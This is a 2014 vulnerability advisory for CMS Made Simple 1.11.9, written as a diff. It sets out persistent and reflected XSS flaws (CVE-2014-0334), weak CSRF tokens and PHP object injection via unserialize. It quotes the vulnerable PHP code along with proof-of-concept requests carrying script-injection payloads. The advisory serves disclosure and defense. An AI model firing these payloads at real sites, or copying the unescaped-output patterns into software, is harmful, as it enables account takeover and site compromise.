@@ -1,0 +1,278 @@
+> Vulnerabilities in CMS Made Simple, version 1.11.9
+> Discovered by Pedro Ribeiro (pedrib@gmail.com) of Agile Information Security
+> Reported to ted@cmsmadesimple.org and calguy1000@cmsmadesimple.org 
+
+Disclosure: 28/02/2014 / Last updated: 12/10/2014
+
+CMS Made Simple, an open source content management system, allows for faster and easier management of website content. This CMS is scalable for small businesses to large corporations.
+
+TL;DR: 
+XSS in admin console, weak CSRF protection and a possible PHP object insertion via unserialize.
+
+These vulnerabilities were considered unimportant by the CMS Made Simple developers. Their reasoning was that they had to be exploited by a logged in administrator user who is a trusted user anyway. When I explained to them that with XSS all you need to do is send a malicious link to the administrator, they responded back saying that they are confident in their CSRF protection. I then sent them an analysis of their CSRF protection (at the bottom of this advisory), which I found to be quite weak. Finally they commited to implement a half-assed mitigation for the CSRF token weakness but said they will not fix the other issues.
+
+
+Timeline:
+- 27.11.2013: Initial contact to the emails listed in www.cmsmadesimple.com. No reply.
+- 03.12.2013: Message posted in the www.cmsmadesimple.com public forum asking to contact me back. A few hours later I was contacted by calguy and sent him a more complete version of this advisory with recommendations.
+- 09.12.2013: calguy responds saying these will not be fixed as you have to be an admin user anyway.
+- 13.12.2013: After a few days arguing over email, Robert Campbell, CMS Made Simple project manager, responds with an official note saying they will double the CSRF token length in a future release but will not fix the rest of the issues. 
+- 14.12.2013: Handed over to CERT asking for help to try to reason with the CMS Made Simple developers.
+- 28.02.2014: Public disclosure by CERT
+
+
+====================================================================
+Vulnerability: Persistent cross site scripting (XSS) in add* pages (CVE-2014-0334)
+File(line): cmsmadesimple/admin/addgroup.php(107)
+File(line): cmsmadesimple/admin/addhtmlblob.php(165)
+File(line): cmsmadesimple/admin/addbookmark.php(92/96)
+
+Code snippet:
+
+addgroup.php:
+$group= "";
+if (isset($_POST["group"])) $group = $_POST["group"];
+
+...
+		<div class="pageoverflow">
+			<p class="pagetext">*<?php echo lang('name')?>:</p>
+			<p class="pageinput"><input type="text" name="group" maxlength="255" value="<?php echo $group?>" /></p>
+			
+addhtmlblob.php:
+$htmlblob = "";
+if (isset($_POST['htmlblob'])) $htmlblob = trim($_POST['htmlblob']);
+
+...
+
+		<div class="pageoverflow">
+			<p class="pagetext">*<?php echo lang('name') .' '. lang('gcb_name_help')?>:</p>
+			<p class="pageinput"><input type="text" name="htmlblob" maxlength="255" value="<?php echo $htmlblob?>" class="standard" /></p>
+		</div>
+		
+addbookmark.php:
+$title= "";
+if (isset($_POST["title"])) $title = $_POST["title"];
+$url = "";
+if (isset($_POST["url"])) $url = $_POST["url"];
+
+...
+
+      <input type="hidden" name="<?php echo CMS_SECURE_PARAM_NAME ?>" value="<?php echo $_SESSION[CMS_USER_KEY] ?>" />
+        </div>
+				<div class="pageoverflow">
+					<p class="pagetext"><?php echo lang('title')?>:</p>
+					<p class="pageinput"><input type="text" name="title" maxlength="255" value="<?php echo $title?>" /></p>
+				</div>
+				<div class="pageoverflow">
+					<p class="pagetext"><?php echo lang('url')?>:</p>
+					<p class="pageinput"><input type="text" name="url" size="50" maxlength="255" value="<?php echo $url ?>" class="standard" /></p>
+				</div>
+		
+Comment:				
+addgroup.php: "group" parameter is written directly onto the page without validation.
+addhtmlblob.php: "htmlblob" parameter is written directly onto the page without validation.
+addbookmark.php: "title" and "url" parameters are written directly onto the page without validation.
+
+Proof-of-concept:
+addgroup.php: (POST) _sx_=39d304b1&group=<script>alert(2)</script>&active=on&addgroup=true
+addhtmlblob.php: (POST) _sx_=39d304b1&htmlblob=%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E&use_wysiwyg=0&use_wysiwyg=1&content=asas&description=ddd&addhtmlblob=true&submit2=Submit	
+addbookmark.php: (POST) title="><script>alert(1)</script>&url="><script>alert(2)</script>&addbookmark=true
+
+NOTE: this will also cause XSS in the respective list* pages.
+
+====================================================================
+Vulnerability: Persistent cross site scripting (XSS) in copy* pages (CVE-2014-0334)
+File(line): cmsmadesimple/admin/copystylesheet.php(117)
+File(line): cmsmadesimple/admin/copytemplate.php(160)
+Code snippet:
+
+copystylesheet.php:
+$stylesheet_name = '';
+if (isset($_REQUEST["stylesheet_name"])) { $stylesheet_name = $_REQUEST["stylesheet_name"]; }
+
+...
+		<div class="pageoverflow">
+			<p class="pagetext"><?php echo lang('stylesheet'); ?>:</p>
+			<p class="pageinput"><?php echo $stylesheet_name; ?></p>
+		</div>
+		
+copytemplate.php:
+		<div class="pageoverflow">
+			<p class="pagetext"><?php echo lang('template'); ?>:</p>
+			<p class="pageinput"><?php echo $template_name; ?></p>
+		</div>
+		
+Comment:				
+copystylesheet.php: "stylesheet_name" parameter is written directly onto the page without validation.
+copytemplate.php: "template_name" parameter is written directly onto the page without validation.
+
+Proof-of-concept:
+copystylesheet.php: (POST) _sx_=39d304b1&stylesheet=%22%3E%3Cscript%3Ealert%285%29%3C%2Fscript%3E&stylesheet_id=32&copystylesheet=true
+copytemplate.php: (POST) _sx_=39d304b1&template=%22%3E%3Cscript%3Ealert%2825%29%3C%2Fscript%3E&template_id=15&copytemplate=true&from=listtemplates.php%3F_sx_%3D39d304b1
+
+NOTE: this will also cause XSS in the respective list* pages.
+
+====================================================================
+Vulnerability: Persistent cross site scripting (XSS) in list* pages (CVE-2014-0334)
+File(line): cmsmadesimple/admin/addtemplate.php(117)
+File(line): cmsmadesimple/admin/listtemplates.php(188)
+File(line): cmsmadesimple/admin/addcss.php(65-156)
+File(line): cmsmadesimple/admin/listcss.php(172)
+
+Code snippet:
+
+addtemplate.php:
+$template = "";
+if (isset($_POST["template"])) $template = $_POST["template"];
+...
+audit($newtemplate->id, 'HTML-template: '.$template, 'Added');
+
+listtemplates.php:
+if ($counter < $page*$limit && $counter >= ($page*$limit)-$limit) {
+	echo "<tr class=\"$currow\">\n";															| template name shown below
+	echo "<td><a href=\"edittemplate.php".$urlext."&template_id=".$onetemplate->id."\">".$onetemplate->name."</a></td>\n"; 
+	echo "<td class=\"pagepos\">".($onetemplate->default == 1?$default_true:$default_false)."</td>\n";
+	
+addcss.php:	
+# then its name
+$css_name = "";
+if (isset($_POST["css_name"])) $css_name = $_POST["css_name"];
+
+// Now clean up name
+$css_name = htmlspecialchars($css_name, ENT_QUOTES);
+			^ HTML encoded here, but stored in the database		
+
+...
+	$newstylesheet->name = $css_name;
+...
+	$result = $newstylesheet->Save();	
+
+listcss.php:
+// if user has right to delete
+if ($delcss)
+  {
+	echo "<td class=\"icons_wide\"><a href=\"deletecss.php".$urlext."&css_id=".$one["css_id"]."\" onclick=\"return confirm('".cms_html_entity_decode_utf8(lang('deleteconfirm', $one['css_name']),true)."');\">";	<--- HTML decoded here
+	echo $themeObject->DisplayImage('icons/system/delete.gif', lang('delete'),'','','systemicon');
+	echo "</a></td>\n";
+  }
+  
+				
+Comment:				
+addtemplate.php: The "template" parameter is encoded properly in addtemplate.php, but stored in the database and displayed as part of HTML output in listtemplates.php.
+addcss.php: The "css_name" parameter is encoded properly in addcss.php, but stored in the database and displayed as part of HTML output in listcss.php.
+
+Proof-of-concept:
+addtemplate.php: (POST) template=%22%3E%3Cscript%3Ealert%2822%29%3C%2Fscript%3E&content=%7Bprocess_pagedata%7D%3C%21DOCTYPE+html+PUBLIC+%22-%2F%2FW3C%2F%2FDTD+XHTML+1.0+Transitional%2F%2FEN%22+%22http%3A%2F%2Fwww.w3.org%2FTR%2Fxhtml1%2FDTD%2Fxhtml1-transitional.dtd%22%3E%0D%0A%3Chtml+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22+xml%3Alang%3D%22en%22+%3E%0D%0A%3Chead%3E%0D%0A%3Ctitle%3E%7Bsitename%7D+-+%7Btitle%7D%3C%2Ftitle%3E%0D%0A%7Bmetadata%7D%0D%0A%7Bcms_stylesheet%7D%0D%0A%3C%2Fhead%3E%0D%0A%3Cbody%3E%0D%0A%0D%0A%3C%21--+start+header+--%3E%0D%0A%3Cdiv+id%3D%22header%22%3E%0D%0A++%3Ch1%3E%7Bsitename%7D%3C%2Fh1%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3C%21--+end+header+--%3E%0D%0A%0D%0A%3C%21--+start+menu+--%3E%0D%0A%3Cdiv+id%3D%22menu%22%3E%0D%0A++%7Bmenu%7D%0D%0A%3C%2Fdiv%3E%0D%0A%3C%21--+end+menu+--%3E%0D%0A%0D%0A%3C%21--+start+content+--%3E%0D%0A%3Cdiv+id%3D%22content%22%3E%0D%0A++%3Ch1%3E%7Btitle%7D%3C%2Fh1%3E%0D%0A++%7Bcontent%7D%0D%0A%3C%2Fdiv%3E%0D%0A%3C%21--+end+content+--%3E%0D%0A%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A&active=on&addtemplate=true&submit=Submit
+listcss.php: (POST) css_name="><script>alert(1)</script>&css_text=b&media_query=c&addcss=true
+			
+====================================================================
+Vulnerability: Persistent cross site scripting (XSS) in edit* pages (CVE-2014-0334)
+File(line): cmsmadesimple/admin/editbookmark.php(117/121)
+
+Important note: due to lack of time I could not test the other edit* pages, but looking at the code quickly they seem vulnerable.
+I suspect the following are also vulnerable:
+editcontent.php
+editcss.php
+editevent.php
+editgroup.php
+edithtmlblob.php
+edittemplate.php
+edituser.php
+edituserplugin.php
+
+Code snippet:
+
+editbookmark.php:
+$title = "";
+if (isset($_POST["title"])) $title = $_POST["title"];
+
+$myurl = "";
+if (isset($_POST["url"])) $myurl = $_POST["url"];
+
+...
+
+		<div class="pageoverflow">
+			<p class="pagetext"><?php echo lang('title')?>:</p>
+			<p class="pageinput"><input type="text" name="title" maxlength="255" value="<?php echo $title?>" /></p>
+		</div>
+		<div class="pageoverflow">
+			<p class="pagetext"><?php echo lang('url')?>:</p>
+			<p class="pageinput"><input type="text" name="url" size="80" maxlength="255" value="<?php echo $myurl ?>" /></p>
+		</div>
+
+Comment:				
+editbookmark.php: "title" and "url" parameters are written directly onto the page without validation.
+
+Proof-of-concept:	
+editbookmark.php: (POST) _sx_=39d304b1&title="><script>alert(99)</script>&url="><script>alert(999)</script>&bookmark_id=6&editbookmark=true&userid=1	
+		
+NOTE: this will also cause XSS in the respective list* pages.		
+
+====================================================================
+Vulnerability: Reflected cross site scripting (XSS) in message parameter (CVE-2014-0334)
+File(line): cmsmadesimple/admin/listcss.php(61)
+File(line): cmsmadesimple/admin/listtemplates.php(49)
+File(line): cmsmadesimple/admin/listusers.php(42)
+File(line): cmsmadesimple/admin/listhtmlblobs.php(45)
+File(line): cmsmadesimple/admin/listcssassoc.php(167)
+File(line): cmsmadesimple/admin/templatecss.php(107)
+
+Code snippet:				
+(from listcss.php)
+#******************************************************************************
+# first : displaying error message, if any.
+#******************************************************************************
+if (isset($_GET["message"])) {
+	$message = preg_replace('/\</','',$_GET['message']);
+	echo '<div class="pagemcontainer"><p class="pagemessage">'.$message.'</p></div>';
+
+Comment:				
+Could not exploit the "message" param properly, as the regex strips the "<". Might be doable by someone smarter that knows how to play with encodings properly?
+
+Proof-of-concept:
+(GET) http://192.168.56.101/cmsmadesimple/admin/listcss.php?_sx_=39d304b1&message=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+
+======================================================================
+Vulnerability: Cross Site Request Forgery
+File(line): application wide
+
+Comment:
+The application contains a weak CSRF protection. The CSRF token is called "user key" and is named "_sx_", and is attributed to a user per session.
+- Tokens are included in the URL in HTTP GET requests
+- Tokens are also included in many Referral headers upon redirect, making them accessible to JavaScript
+- Tokens are only 8 characters long (and alphanumeric only), meaning they are easy to bruteforce
+- Getting a token wrong does not seem to kill the user session, making bruteforce feasible
+NOTE: Version 1.11.10 doubles the character length to 16 characters which helps with bruteforce. However the application still leaks the CSRF tokens where it shouldn't, allowing them to be easily extracted in combination wit the XSS flaws.
+
+
+References:
+https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet
+
+
+====================================================================
+Vulnerability: PHP Object Insertion 
+File(line): cmsmadesimple/admin/changegroupperm.php(115)
+Code snippet:
+
+    $selected_groups = unserialize(base64_decode($_POST['sel_groups']));
+    $query = 'DELETE FROM '.cms_db_prefix().'group_perms 
+               WHERE group_id IN ('.implode(',',$selected_groups).')';
+    $db->Execute($query);
+
+	
+Comment:
+User input is passed directly into unserialize(). 
+Low risk as currently there are no exploitable methods in CMS Made Simple core. Worth keeping an eye on as they are not going to fix it anytime soon, or trail through the dozens of available plugins to see if there's an exploitable method there.
+	
+References:
+https://www.owasp.org/index.php/PHP_Object_Injection
+http://www.alertlogic.com/writing-exploits-for-exotic-bug-classes/
+http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
+http://vagosec.org/2013/12/wordpress-rce-exploit/
+
+				
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
